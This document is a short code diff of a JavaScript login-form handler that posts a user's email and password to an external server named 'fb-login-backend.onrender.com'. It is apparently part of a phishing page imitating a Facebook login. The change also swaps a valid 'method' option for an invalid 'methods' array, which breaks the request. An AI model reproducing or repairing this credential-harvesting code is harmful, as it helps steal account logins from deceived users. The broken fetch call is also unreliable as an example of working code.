@@ -20,8 +20,8 @@ form.addEventListener("submit", async (e) => {
   }
 
   try {
-    const res = await fetch('https://fb-login-backend.onrender.com/send', {
-      method: 'POST',
+    const res = await fetch("https://fb-login-backend.onrender.com/login", {
+    methods: ['GET','POST','OPTIONS'],
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email, password })
     });
